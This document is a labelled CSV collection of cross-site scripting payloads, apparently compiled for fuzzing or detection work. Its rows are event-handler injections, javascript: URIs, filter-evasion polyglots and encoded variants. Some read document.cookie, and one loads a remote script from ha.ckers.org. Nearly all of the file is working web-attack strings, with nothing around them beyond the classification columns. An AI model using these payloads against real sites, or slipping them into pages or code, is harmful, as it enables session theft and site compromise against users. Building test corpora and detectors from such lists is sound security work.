payload,context,technique,severity,length
"<p oncontextmenu=""alert(1)"">AnonKryptiQuz</p>",tag_injection,none,medium,45
<hgroup id=x tabindex=1 ondeactivate=alert(1)></hgroup><input id=y autofocus>,tag_injection,none,medium,77
"<button onmousedown=""alert(1)"" style=display:block>AnonKryptiQuz</button>",tag_injection,none,medium,73
--><!-- --\x21> <img src=xxx:x onerror=javascript:alert(1)> -->,js_uri,comment_injection,medium,63
"<bdo onmouseout=""alert(1)"" style=display:block>AnonKryptiQuz</bdo>",tag_injection,none,medium,66
<menuitem onfocusout=alert(1) autofocus tabindex=1 style=display:block>AnonKryptiQuz</menuitem><input value=clickme>,tag_injection,none,medium,116
"<tr onmouseenter=""alert(1)"" style=display:block>AnonKryptiQuz</tr>",tag_injection,none,medium,66
<--`<img%2fsrc%3d` onerror%3dalert(document.domain)> --!>,dom_sink,url_encoding,medium,57
<script <B>document.vulnerable=true;</script>,dom_sink,none,low,45
<nobr onafterscriptexecute=alert(1)><script>1</script>,script_injection,none,medium,54
"<P STYLE=""behavior:url('#default#time2')"" end=""0"" onEnd=""javascript:alert(1041)"">",js_uri,case_variation,medium,81
"<body onmouseleave=""alert(1)"" style=display:block>AnonKryptiQuz</body>",tag_injection,none,medium,70
"<nobr draggable=""true"" ondragleave=""alert(1)"">AnonKryptiQuz</nobr>",tag_injection,none,medium,66
"<command onpaste=""alert(1)"" contenteditable>AnonKryptiQuz</command>",tag_injection,none,medium,67
"<style>@keyframes x{}</style><br style=""animation-name:x"" onwebkitanimationend=""alert(1)""></br>",tag_injection,none,medium,95
"<img src onerror /"" '""= alt=javascript:alert(2211)//"">",js_uri,none,medium,54
<detalhes%0Aopen%0AonToGgle%0A=%0Aabc=(co\u006efirm);abc%28%60xss%60%26%230000000000000000041//,generic,unicode_escape|url_encoding,low,95
"<head oncopy=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",tag_injection,none,medium,98
"<style>@keyframes slidein {}</style><bdi style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></bdi>",tag_injection,none,medium,160
"<br onbeforepaste=""alert(1)"" contenteditable>AnonKryptiQuz</br>",tag_injection,none,medium,63
X<x style=`behavior:url(#default#time2)` onbegin=`javascript:alert(1)` >,js_uri,none,medium,72
"<col onbeforepaste=""alert(1)"" contenteditable>AnonKryptiQuz</col>",tag_injection,none,medium,65
"<div draggable=""true"" contenteditable>drag me</div><figcaption ondragover=alert(1) contenteditable style=display:block>drop here</figcaption>",tag_injection,none,medium,141
"<q oncut=""alert(1)"" contenteditable>AnonKryptiQuz</q>",tag_injection,none,medium,53
<body onmousewheel=alert(1) style=display:block>requires scrolling,tag_injection,none,medium,66
"<ol onpaste=""alert(1)"" contenteditable>AnonKryptiQuz</ol>",tag_injection,none,medium,57
<ruby onafterscriptexecute=alert(1)><script>1</script>,script_injection,none,medium,54
"""></iframe><script>alert(`TEXT YOU WANT TO BE DISPLAYED`);</script><iframe frameborder=""0%EF%BB%BF",script_injection,url_encoding,medium,98
"//"";alert(String.fromCharCode(88,83,83))",generic,encoding,high,40
"<dialog onkeypress=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</dialog>",tag_injection,none,medium,88
"%22onmouseover=window[%27al%27%2B%27er%27%2B([%27t%27,%27b%27,%27c%27][0])](document[%27cooki%27%2B(['e','c','z'][0])]);%22",event_handler,url_encoding,low,123
"<header oncut=""alert(1)"" contenteditable>AnonKryptiQuz</header>",tag_injection,none,medium,63
"<frame onkeypress=""alert(1)"" contenteditable>AnonKryptiQuz</frame>",tag_injection,none,medium,66
"astNode.operator='(window.X?void0:(window.X=true,alert(1)))+';",dom_sink,none,medium,62
"<command onkeydown=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</command>",tag_injection,none,medium,89
"<pre onbeforecut=""alert(1)"" contenteditable>AnonKryptiQuz</pre>",tag_injection,none,medium,63
"<bdo draggable=""true"" ondragstart=""alert(1)"">AnonKryptiQuz</bdo>",tag_injection,none,medium,64
"<abbr onmouseout=""alert(1)"" style=display:block>AnonKryptiQuz</abbr>",tag_injection,none,medium,68
"""><svg/onload=alert(/AnonKryptiQuz/)",tag_injection,none,medium,36
"<div draggable=""true"" contenteditable>drag me</div><button ondragover=alert(1) contenteditable style=display:block>drop here</button>",tag_injection,none,medium,133
"<header draggable=""true"" ondragleave=""alert(1)"">AnonKryptiQuz</header>",tag_injection,none,medium,70
"<marquee onkeydown=""alert(1)"" contenteditable>AnonKryptiQuz</marquee>",tag_injection,none,medium,69
"<ins draggable=""true"" ondrag=""alert(1)"">AnonKryptiQuz</ins>",tag_injection,none,medium,59
"<shadow onbeforecut=""alert(1)"" contenteditable>AnonKryptiQuz</shadow>",tag_injection,none,medium,69
<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa  aaaaaaaaa aaaaaaaaaa  href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe,generic,html_entity,low,114
"<HEAD><META HTTP-EQUIV=""CONTENT-TYPE"" CONTENT=""text/html; charset=UTF-7""> </HEAD>+ADw-SCRIPT+AD4-%(payload)s;+ADw-/SCRIPT+AD4-",tag_injection,case_variation,low,126
"<style>@keyframes x{}</style><s style=""animation-name:x"" onanimationstart=""alert(1)""></s>",tag_injection,none,medium,89
"<style>:target {color: red;}</style><isindex id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></isindex>",tag_injection,none,medium,117
"<tr draggable=""true"" ondrag=""alert(1)"" style=display:block>AnonKryptiQuz</tr>",tag_injection,none,medium,77
"""></tag><svg onload=alert(1)>",tag_injection,none,medium,29
"<track oncopy=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",tag_injection,none,medium,99
<button popovertarget=x>Click me</button><select ontoggle=alert(1) popover id=x>AnonKryptiQuz</select>,tag_injection,none,medium,102
"<img2 onmousedown=""alert(1)"" style=display:block>AnonKryptiQuz</img2>",tag_injection,none,medium,69
"<spacer onclick=""alert(1)"">AnonKryptiQuz</spacer>",tag_injection,none,medium,49
'>><marquee><h1>XSS</h1></marquee>,attribute_escape,none,low,34
"<style>:target {color:red;}</style><big id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></big>",tag_injection,none,medium,110
"<p onmouseup=""alert(1)"">AnonKryptiQuz</p>",tag_injection,none,medium,41
<button popovertarget=x>Click me</button><thead ontoggle=alert(1) popover id=x>AnonKryptiQuz</thead>,tag_injection,none,medium,100
"<div draggable=""true"" contenteditable>drag me</div><aside ondragover=alert(1) contenteditable style=display:block>drop here</aside>",tag_injection,none,medium,131
"'-eval(""window['pro'%2B'mpt'](8)"")-'",dom_sink,encoding|url_encoding,low,36
"<samp onclick=""alert(1)"" style=display:block>AnonKryptiQuz</samp>",tag_injection,none,medium,65
"<pre draggable=""true"" ondrag=""alert(1)"" style=display:block>AnonKryptiQuz</pre>",tag_injection,none,medium,79
"<style onkeypress=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</style>",tag_injection,none,medium,86
"<picture><source srcset=""validimage.png""><image onloadend=alert(1)></picture>",tag_injection,none,medium,77
<header onpointerout=alert(1) style=display:block>AnonKryptiQuz</header>,tag_injection,none,medium,72
"<col oncut=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",tag_injection,none,medium,96
<embed onmousewheel=alert(1) style=display:block>requires scrolling,tag_injection,none,medium,67
"<style>@keyframes x{}</style><svg style=""animation-name:x"" onanimationstart=""alert(1)""></svg>",tag_injection,none,medium,93
"javascript:`//""//\""//</title></textarea></style></noscript></noembed></script></template><svg/onload='/*--><html */ onmouseover=alert()//'>`",js_uri,comment_injection,medium,140
"<rb onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>AnonKryptiQuz</span></rb>",tag_injection,none,medium,277
<details id=x tabindex=1 ondeactivate=alert(1)></details><input id=y autofocus>,tag_injection,none,medium,79
<option onblur=alert(1) tabindex=1 id=x></option><input autofocus>,tag_injection,none,medium,66
"<li draggable=""true"" ondragenter=""alert(1)"" style=display:block>AnonKryptiQuz</li>",tag_injection,none,medium,82
"<style>:target {color:red;}</style><table id=x style=""transition:color 1s"" ontransitionend=alert(1)></table>",tag_injection,none,medium,108
"<track draggable=""true"" ondragenter=""alert(1)"">AnonKryptiQuz</track>",tag_injection,none,medium,68
<hgroup onmousewheel=alert(1) style=display:block>requires scrolling,tag_injection,none,medium,68
"<style>@keyframes slidein {}</style><blink style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></blink>",tag_injection,none,medium,164
"<small onpaste=""alert(1)"" contenteditable>AnonKryptiQuz</small>",tag_injection,none,medium,63
"<noembed onbeforepaste=""alert(1)"" contenteditable>AnonKryptiQuz</noembed>",tag_injection,none,medium,73
"<ins onmouseleave=""alert(1)"" style=display:block>AnonKryptiQuz</ins>",tag_injection,none,medium,68
"<<TexTArEa/*%00//%00*/a=""not""/*%00///AutOFocUs////onFoCUS=alert`AnonKryptiQuz` //",tag_injection,comment_injection|url_encoding|case_variation,low,81
"<th onmouseover=""alert(1)"" style=display:block>AnonKryptiQuz</th>",tag_injection,none,medium,65
';globalThis['ale'+'rt'](globalThis['doc'+'ument']['dom'+'ain']);//,attribute_escape,none,low,67
"<style>@keyframes x{}</style><dir style=""animation-name:x"" onwebkitanimationend=""alert(1)""></dir>",tag_injection,none,medium,97
<samp id=x tabindex=1 onbeforedeactivate=alert(1)></samp><input autofocus>,tag_injection,none,medium,74
<main id=x tabindex=1 onactivate=alert(1)></main>,tag_injection,none,medium,49
"<rp onkeydown=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</rp>",tag_injection,none,medium,79
jaVasCript:/*-/*`/*\`/*'/*&quot;/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//%0D%0A%0d%0a//%0D%0A%0d%0a//%0D%0A%0d%0a//%0D%0A%0d%0a//%0D%0A%252f%252a*/(/*%252f%252a*/*&#x252f;&#x252a;prompt(1)&#x252f;&#x253b;/**/;eval(atob('YWxlcnQoIkhpISIp'))//%0D%0A%0d%0a//%0D%0A%0d%0a//%0D%0A%0d%0a//%0D%0A%0d%0a//%0D%0A%0d%0a//%0D%0A%252f%252a*/)//,dom_sink,html_entity|encoding|comment_injection|url_encoding,high,334
"<slot oncut=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",tag_injection,none,medium,97
"<custom tags oncut=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",tag_injection,none,medium,104
<dl onmousewheel=alert(1) style=display:block>requires scrolling,tag_injection,none,medium,64
"var re = /jaVasCript:/*-/*`/*\`/*'/*""/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e/;",js_uri,comment_injection|url_encoding|case_variation,medium,156
"<bdo draggable=""true"" ondragexit=""alert(1)"" style=display:block>AnonKryptiQuz</bdo>",tag_injection,none,medium,83
"<section onkeyup=""alert(1)"" contenteditable>AnonKryptiQuz</section>",tag_injection,none,medium,67
&#34;&#62;<h1/onmouseover='\u0061lert(/AmoloHT/)'>,tag_injection,unicode_escape|html_entity,low,50
"<IMG SRC=x ondrop=""alert(String.fromCharCode(88,83,83))"">",tag_injection,encoding|case_variation,high,57
<meter onmousewheel=alert(1) style=display:block>requires scrolling,tag_injection,none,medium,67
"<SCRIPT/AnonKryptiQuz SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",script_injection,case_variation,low,64
"<style>@keyframes x{}</style><sub style=""animation-name:x"" onanimationstart=""alert(1)""></sub>",tag_injection,none,medium,93
"<small ondblclick=""alert(1)"">AnonKryptiQuz</small>",tag_injection,none,medium,50
"<del draggable=""true"" ondragend=""alert(1)"">AnonKryptiQuz</del>",tag_injection,none,medium,62
"<progress onkeypress=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</progress>",tag_injection,none,medium,92
"<menuitem onmouseup=""alert(1)"" style=display:block>AnonKryptiQuz</menuitem>",tag_injection,none,medium,75
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><hgroup id=x style=""position:absolute;"" onanimationcancel=""print()""></hgroup>",tag_injection,none,low,181
"<div draggable=""true"" contenteditable>drag me</div><listing ondrop=alert(1) contenteditable>drop here</listing>",tag_injection,none,medium,111
\<a onmouseover=alert(document.cookie)\>xxs link\</a\>,dom_sink,none,high,54
"avascript:/*""/*'/*\""/*`/*><frame src=javascript:alert()></template </textarea </title </style </noscript </noembed </script --><<script>alert()<</script>\ /**/alert()//",script_injection,comment_injection,medium,168
"<shadow ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>AnonKryptiQuz</shadow>",tag_injection,none,medium,93
<progress onblur=alert(1) id=x tabindex=1 style=display:block>AnonKryptiQuz</progress><input value=clickme>,tag_injection,none,medium,107
"<script\x09type=""text/javascript"">javascript:alert(1);</script>",script_injection,none,medium,63
"<form><a href=""javascript:\u0061lert&#x28;1&#x29;"">X</script><img/*/src=""worksinchrome&colon;prompt&#x28;1&#x29;""/*/onerror='eval(src)'>",dom_sink,unicode_escape|html_entity|encoding|comment_injection,low,136
"<font draggable=""true"" ondragleave=""alert(1)"">AnonKryptiQuz</font>",tag_injection,none,medium,66
"<label oncut=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",tag_injection,none,medium,98
"<hgroup onmouseleave=""alert(1)"">AnonKryptiQuz</hgroup>",tag_injection,none,medium,54
"<var onkeyup=""alert(1)"" contenteditable>AnonKryptiQuz</var>",tag_injection,none,medium,59
"<param oncopy=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",tag_injection,none,medium,99
"<font onkeypress=""alert(1)"" contenteditable>AnonKryptiQuz</font>",tag_injection,none,medium,64
"<xmp draggable=""true"" ondrag=""alert(1)"" style=display:block>AnonKryptiQuz</xmp>",tag_injection,none,medium,79
"<style>@keyframes x{}</style><form style=""animation-name:x"" onanimationend=""alert(1)""></form>",tag_injection,none,medium,93
"<IMG SRC=x onemptied=""alert(String.fromCharCode(88,83,83))"">",tag_injection,encoding|case_variation,high,60
"<style>@keyframes slidein {}</style><audio2 style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></audio2>",tag_injection,none,medium,172
"<a href=""javas\x07cript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",js_uri,none,medium,71
"<rt onclick=""alert(1)"">AnonKryptiQuz</rt>",tag_injection,none,medium,41
<ruby contenteditable onbeforeinput=alert(1)>AnonKryptiQuz,tag_injection,none,medium,58
"%20""><img src=q onerror=alert(1)>",tag_injection,url_encoding,medium,33
"<samp onkeyup=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</samp>",tag_injection,none,medium,81
<textarea autofocus onfocusin=alert(1)>AnonKryptiQuz</textarea>,tag_injection,none,medium,63
"<bdo onkeydown=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</bdo>",tag_injection,none,medium,81
"<cite ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>AnonKryptiQuz</cite>",tag_injection,none,medium,89
"<div draggable=""true"" contenteditable>drag me</div><iframe ondragover=alert(1) contenteditable style=display:block>drop here</iframe>",tag_injection,none,medium,133
"<nav onkeydown=""alert(1)"" contenteditable>AnonKryptiQuz</nav>",tag_injection,none,medium,61
"<label draggable=""true"" ondragend=""alert(1)"">AnonKryptiQuz</label>",tag_injection,none,medium,66
<center onblur=alert(1) id=x tabindex=1 style=display:block>AnonKryptiQuz</center><input value=clickme>,tag_injection,none,medium,103
"<hgroup onpaste=""alert(1)"" contenteditable>AnonKryptiQuz</hgroup>",tag_injection,none,medium,65
<shadow id=x tabindex=1 onactivate=alert(1)></shadow>,tag_injection,none,medium,53
"<img onclick=""alert(1)"">AnonKryptiQuz</img>",tag_injection,none,medium,43
"<time onkeydown=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</time>",tag_injection,none,medium,83
<svg@load=this.alert(1)>,generic,none,medium,24
<ol onfocusout=alert(1) tabindex=1 id=x></ol><input autofocus>,tag_injection,none,medium,62
"<dETAILS%0aopen%0aonToGgle%0a%3d%0aa%3dprompt,a(origin)%20x>",generic,url_encoding|case_variation,low,60
<x contenteditable oninput=alert(1)>input here!,tag_injection,none,medium,47
"<menu onclick=""alert(1)"">AnonKryptiQuz</menu>",tag_injection,none,medium,45
